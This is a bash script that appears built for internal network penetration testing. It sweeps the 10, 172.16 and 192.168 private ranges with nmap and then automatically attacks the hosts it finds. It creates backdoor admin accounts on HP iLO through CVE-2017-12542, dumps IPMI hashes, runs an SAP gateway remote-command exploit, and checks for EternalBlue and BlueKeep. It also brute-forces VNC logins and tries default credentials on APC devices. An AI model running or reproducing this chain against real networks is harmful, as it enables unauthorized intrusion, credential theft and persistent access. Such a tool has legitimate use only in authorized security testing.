echo `date` INFO: Performing smart 192,172 and 10. scans this takes about 5-7 days

echo `date` INFO: Starting 192.
nmap -v -T5 -oA 192 -sV --top-ports 40 --open --randomize-hosts --defeat-rst-ratelimit  192.168.0.0/16

# scan 10 and 172 just  1,2,3,10,20,30,100,254 
echo `date` INFO: Starting 172.
nmap --max-retries 1 --min-parallelism 100 -oA 172_GUESS --top-ports 20 -T5 --open --randomize-hosts --defeat-rst-ratelimit  172.16-31.0-255.1,2,3,10,20,30,100,254
grep open 172_GUESS.gnmap | awk '{print $2}'  | sed -r  's/(.*\..*\..*\.).*/\10\/24/'g | sort -u > 172_NETWORKS
nmap -v -T5 -oA 172_NETWORKS -sV  --top-ports 40 --open --randomize-hosts --defeat-rst-ratelimit -iL 172_NETWORKS

echo `date` INFO: Starting 10.
nmap --max-retries 1 --min-parallelism 100 -oA 10_GUESS --top-ports 20 -T5 --open --randomize-hosts --defeat-rst-ratelimit 10.0-255.0-255.1,2,3,10,20,30,100,254
grep open 10_GUESS.gnmap | awk '{print $2}'  | sed -r  's/(.*\..*\..*\.).*/\10\/24/'g | sort -u > 10_NETWORKS
nmap -v -T5 -oA 10_NETWORKS -sV  --top-ports 40 --open --randomize-hosts --defeat-rst-ratelimit  -iL 10_NETWORKS 

echo `date` INFO: Compleated Nmap
grep open *.gnmap | awk '{print $2}'|  sort -u | uniq -c | sort -nr > ALL_IPS_WITH_OPEN.txt


# IP,Portlist
grep open *.gnmap | grep -E "(Host: )" | sed 's/,/ /g'| sed 's/.*Host: //g' | sed -r 's/( \(.*\)).*Ports: /,\1,/g' | sed 's/\bIgnored State.*//g' | sed 's/\/\/\///g' > IP_PORTLIST.txt


# IP,DEVICE,HOSTNAME
grep  -Eiah "(Service Info|Nmap scan)" *.nmap|grep -B 1 "Service Info" | grep -v '\-\-'|sed -r 's/Service Info.*: /,/g' | tr -d '\n'| awk '{gsub("Nmap scan report for ","\n"); print}' | sed -r 's/(.*) \((.*)\)(.*)/\2\3,\1/g' > IP_DEVICE_HOSTNAME.csv
# get count of *nix servers
grep -h '22\/open' *.gnmap | grep -Evai "(cisco|Gateway|goahead|2016.74|Ricoh WS Discovery|sunssh|HP Integrated)" | sed 's/Seq.*//g'| sed 's/Ignored.*//g'| sed 's/  //g'|sed 's/\t//g' |sed 's/,/ /g'|sed -r 's/Host: ([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}).*Ports: (.*)/\2,\1 /g' > PORT_IP_LINUX.csv

# PORTS,IP
grep -h '\/open' *.gnmap | sed 's/Seq.*//g'| sed 's/Ignored.*//g'| sed 's/  //g'|sed 's/\t//g' |sed 's/,/ /g' | sed -r 's/Host: ([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}).*Ports: (.*)/\2,\1 /g' > PORTS_IP.csv

# subnet counts Up
grep open *.gnmap | grep -Eo "([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})"|sort -u|  grep -Eo "([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})" | sort | uniq -c | sort -nr |awk '{print $1","$2}'> SUBNET_UP.csv

# subnet up open ports count
grep open *.gnmap |grep open| grep -Eo "([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})"|sort -u|  grep -Eo "([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})" | sort | uniq -c | sort -nr |awk '{print $1","$2}'> SUBNET_OPEN_PORTS.csv


# clean /tmp
 
rm /tmp/*.csv

# copy
cp *.csv /tmp
chmod 744 /tmp/*.csv



echo `date` INFO: Running FRUIT path assumes you have ./metasploit/msfconsole ./changeme/changeme.py ./SAP_GW_RCE_exploit

echo FRUIT!
#iDRAC login check
grep -iaE  "(Mbedthis|idrac)" *.gnmap | awk '{print $2}' | sort -u > idrac.txt

cat <<EOF> idrac.rc
use auxiliary/scanner/http/dell_idrac
set THREADS 50
set RHOSTS file:$PWD/idrac.txt
run
quit
EOF

./metasploit/msfconsole -r idrac.rc | tee SAUSE_idrac.txt

cat SAUSE_idrac.txt | grep SUCC | sort -u | sed -r 's/.*https:\/\/(.*):.* user (.*)/\1,\2/g' >> SAUSE_ALL.csv

#ms08067
grep -E "(445\/open|137\/open)" *.gnmap | awk '{print $2}' | sort -u > ms08067.txt
nmap  --max-retries 1 --min-parallelism 100  --defeat-rst-ratelimit   -T5 --script smb-vuln-ms08-067.nse -p445 -iL ms08067.txt -oA ms08067
grep VULNERABLE ms08067.* | tee SAUSE_ms08067.txt
grep -E "(Nmap scan r|VULNERABLE)"  ms08067.nmap|grep -B 1 "VULNERABLE:" | grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | sed 's/$/,ms08067/g' >> SAUSE_ALL.csv


# iLO

grep -E "(iLO|Nmap scan)" *.nmap | grep -B 1 iLO | grep Nmap | awk '{print $5}' > ilo.txt

cat <<EOF> hp_ilo_create_admin_account.rc
use auxiliary/admin/hp/hp_ilo_create_admin_account
set USERNAME robertmccurdy
set PASSWORD NoxOnBoxOnSox
set RHOSTS file:$PWD/ilo.txt
run
quit
EOF

./metasploit/msfconsole -r hp_ilo_create_admin_account.rc  |tee SAUSE_hp_ilo_create_admin_account.txt

grep -E "(user already exists|created successfully|Running module against)" SAUSE_hp_ilo_create_admin_account.txt | grep -E "(user already exists|created successfully)" -B 1 | grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | sed 's/$/,CVE-2017-12542 iLO auth bypass/g' >> SAUSE_ALL.csv



#IPMI hash dump 
grep -iEr "(Nmap scan|ipmi)" * | grep -B 1 -ia ipmi | grep "Nmap scan report" | awk '{print $5}' |  grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" > ipmihash.txt

cat <<EOF> ipmihash.rc
use auxiliary/scanner/ipmi/ipmi_dumphashes
set THREADS 16
set RHOSTS file:$PWD/ipmihash.txt
run
quit
EOF

./metasploit/msfconsole -r ipmihash.rc  |tee  SAUSE_ipmi_hash.txt

grep 'Hash ' SAUSE_ipmi_hash.txt | sed 's/:/,/g' | sed -r 's/.*\b([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/\1/g' >> SAUSE_ALL.csv


#IPMI cipher zero
grep -iE "(dropbear)" *.gnmap|grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | sort -u > ipmi_cipher_zero.txt
nmap --open -p 623 --max-retries 1 --min-parallelism 100  --defeat-rst-ratelimit   -T5  -iL ipmi_cipher_zero.txt -oA ipmi_cipher_zero
grep -E "(623\/open)" *.gnmap| grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | sort -u > ipmi_cipher_zero.txt

cat <<EOF> ipmihash.rc
use auxiliary/scanner/ipmi/ipmi_cipher_zero
set THREADS 16
set RHOSTS file:$PWD/ipmi_cipher_zero.txt
run
quit
EOF

./metasploit/msfconsole -r ipmihash.rc |tee  SAUSE_ipmi_zero.txt

grep VULNERABLE  SAUSE_ipmi_zero.txt |  sed 's/:623 - /,/g' |sed -r 's/.*\b([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/\1/g' >>  SAUSE_ALL.csv


# apc
grep -Eia "(Nmap scan|power|apc)" *.nmap |grep -B 1 -Eia "(power|apc)" | grep Nmap | awk '{print $5}'|grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"  | sort -u > apc.txt

echo 'for i in `cat apc.txt`' > apc.sh
echo 'do ./changeme/changeme.py  $i &' >>apc.sh
echo 'sleep 1' >> apc.sh
echo 'done ' >> apc.sh

bash apc.sh | tee apc_out.txt

grep -ia '\-\-' -A 1 apc_out.txt |grep -v '\-\-'|grep -v read > SAUSE_APC.txt

cat SAUSE_APC.txt | sed -r 's/.*\/\/([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})(.*)/\1,\2/g' >> SAUSE_ALL.csv



#ms17-010
grep -E "(445\/open)" *.gnmap| awk '{print $2}' | sort -u > ms17.txt
nmap  --max-retries 1 --min-parallelism 100  --defeat-rst-ratelimit   -T5  --script smb-vuln-ms17-010 -p445 -iL ms17.txt -oA ms17
grep VULNERABLE ms17.* > SAUSE_ms17.txt
grep -E "(Nmap scan|VULNERABLE)" ms17.nmap | grep VULNERABLE -B 1 | grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | sort -u | sed 's/$/,smb-vuln-ms17-010 EternalBlue/g' >> SAUSE_ALL.csv 


#SAP check hot mess


grep -Eia "(sap)" *.gnmap|grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"  | sort -u > SAP.txt
nmap  --defeat-rst-ratelimit --max-retries 1 --min-parallelism 100  -p 3300 -iL SAP.txt -oA SAP -T5

IFS=$'\n'

cd SAP_GW_RCE_exploit
rm ../SAP1.txt
rm ../SAP1*.txt

for i in `grep -h 'ceph' ../*.gnmap | grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"|sort -u`
do

echo IP:$i | tee -a ../SAP1_$i.txt


python2.7  ./SAPanonGWv2.py -t $i -p 3300 -c whoami 2> /dev/null | tee -a ../SAP1_$i.txt  &

done

echo sleeping 15 seconds  for all proccess to finish and timeout ...
sleep 15
killall -9 python2.7
cat ../SAP1_*.txt | grep -vEia "(INFO|Error|TIME:|RELEASE:|COMP|RC:|LINE|DETAILS|COUNTER|LOCA|VER|MODU)" | grep -E -B 1 "(^[a-z])" |grep -v '\-\-' | sed -r 's/(^[a-z].*\b)/,\1 SAP_GW_RCE_exploit/g' | tr -d '\n' |  awk '{gsub("IP:","\n"); print}' >> ../SAUSE_ALL.csv


cd ..





#  realvnc_41_bypass
grep -E "(5900\/open)" *.gnmap| grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | sort -u > realvnc_41_bypass.txt
nmap --max-retries 1 --min-parallelism 100  --defeat-rst-ratelimit   -T5  --script=realvnc-auth-bypass -p 5900 -iL realvnc_41_bypass.txt -oA realvnc_41_bypass
grep -E "(VULNERABLE:|Nmap scan)" realvnc_41_bypass.nmap | grep -B 1 'VULNERABLE:' | grep 'Nmap scan' | awk '{print $5",bl4ck-vncviewer-authbypass"}' >> SAUSE_ALL.csv


# rdpscan
grep -E "(3389\/open)" *.gnmap| grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | sort -u > rdpscan.txt
./rdpscan/rdpscan --file rdpscan.txt --workers 10000 |tee rdpscan_out.txt
grep VULNERABLE rdpscan_out.txt | sed 's/ - VULNERABLE - got appid/,rdpscan for CVE-2019-0708 bluekeep vuln/g' >> SAUSE_ALL.csv 

#    vnc
grep -E "(5900\/open)" *.gnmap| grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | sort -u > vnc.txt
echo `date` DEBUG: Checking for defualt logins for VNC with medusa scanner
medusa -M vnc -H vnc.txt -C  ./VNC/wordList_vnc.txt   -T 100 -L -f| tee SAUSE_VNC.txt
grep FOUND SAUSE_VNC.txt  | sed 's/.*Host: //g' | sed 's/ User/,User/g' >> SAUSE_ALL.csv


#vsftpd_234_backdoor
grep -E "(21\/open)" *|grep -ia vsftp | grep -iaEo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | sort -u > vsftpd_234_backdoor.txt
nmap  --max-retries 1 --min-parallelism 100  --defeat-rst-ratelimit   -T5  -p 21 --script ftp-vsftpd-backdoor -iL vsftpd_234_backdoor.txt -oA vsftpd_234_backdoor   |tee SAUSE_vsftpd_234_backdoor.txt
grep VULN vsftpd_234_backdoor.nmap >> SAUSE_ALL.csv

# add path checks for   ./metasploit/msfconsole ./changeme/changeme.py ./SAP_GW_RCE_exploit
# add sysvold admin hash check
## Biszploit PIRA to get running
## eyewitness RDP and VNC ?
## webdump_burp ?
## changeme
#dir_webdav_unicode_bypass
#multi/http/jenkins_script_console
#open_x11 6000
#cisco_smart_install
#jboss_vulnscan
#tomcat_mgr_login
#hp_system_management
#hp_sys_mgmt_exec
#HP System Management - Anonymous Access Code Execution (Metasploit)
#https://www.offensive-security.com/metasploit-unleashed/auxiliary-module-reference/
#
#viem backup default
#Symantec backup
